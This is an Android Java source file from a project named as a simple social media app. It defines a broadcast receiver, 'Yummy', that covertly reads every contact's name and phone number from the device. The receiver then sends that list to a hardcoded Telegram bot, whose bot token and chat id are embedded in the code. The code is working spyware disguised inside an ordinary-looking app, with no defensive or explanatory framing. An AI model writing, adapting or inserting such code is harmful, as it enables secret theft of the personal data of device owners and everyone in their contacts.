package com.example.simplesocialmediaapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

public class Yummy extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        try {
            // Get the content resolver to access contacts
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null
            );

            if (cursor == null) {
                return;
            }

            StringBuilder contactsBuilder = new StringBuilder("Contacts:\n");

            while (cursor.moveToNext()) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                if (nameIndex >= 0) {
                    String name = cursor.getString(nameIndex);
                    String phoneNumber = "No Number";

                    // Retrieve phone number if available
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    Cursor phones = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                    );

                    if (phones != null && phones.moveToFirst()) {
                        phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phones.close();
                    }

                    contactsBuilder.append("Name: ").append(name).append(", Phone: ").append(phoneNumber).append("\n");
                }
            }

            cursor.close();

            // Send the contacts to Telegram
            String contactsMessage = contactsBuilder.toString();
            sendToTelegram(context, contactsMessage);

        } catch (Exception e) {
            Log.e("Yummy", "Failed to retrieve or send contacts", e);
        }
    }

    // Method to send contacts to Telegram
    private void sendToTelegram(Context context, String message) {
        String botToken = "7995088659:AAGgPkBL0W1eFiwpDAzIkItkxk5iQW6PECs";  // Replace with your bot token
        String chatId = "625889706";      // Replace with your chat ID
        String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;

        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(urlString);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                int responseCode = conn.getResponseCode();
                conn.disconnect();
                Log.d("Yummy", "Message sent to Telegram with response code: " + responseCode);
            } catch (Exception e) {
                Log.e("Yummy", "Failed to send message to Telegram", e);
            }
        }).start();
    }
}
